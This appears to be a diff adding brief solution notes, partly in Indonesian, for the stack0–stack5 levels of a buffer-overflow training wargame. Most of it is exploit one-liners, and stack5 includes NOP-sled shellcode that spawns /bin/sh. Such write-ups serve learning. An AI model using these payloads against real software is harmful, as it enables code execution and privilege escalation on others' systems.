@@ -1,0 +1,43 @@
+stack0
+=======
+
+python -c 'print "A"*65' | ./stack0
+
+stack1
+=======
+
+./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
+
+stack2
+=======
+
+Di soal ini kita harus menggunakan environment variable
+
+export GREENIE=$(python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"')
+./stack2
+
+stack3
+=======
+
+python -c 'print "A"*68' | ./stack3
+
+stack4
+=======
+
+Jump ke alamat fungsi win() di 0x080483f4
+
+python -c 'print "A"*76+"\xf4\x83\x04\x08"' | ./stack4
+
+stack5
+=======
+
+Saya cukup kesulitan untuk mengerjakan soal ini, karena exploit yang saya
+tulis selalu Illegal instruction dan Segmentation fault. 
+
+
+kasih breakpoint di fungsi main
+print $esp
+
+catetan = $esp (return address) + 176
+
+(python -c "import sys; sys.stdout.write('\x90'*76 + '\x10\xf7\xff\xbf' + '\x90'*30 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')";) | ./stack5
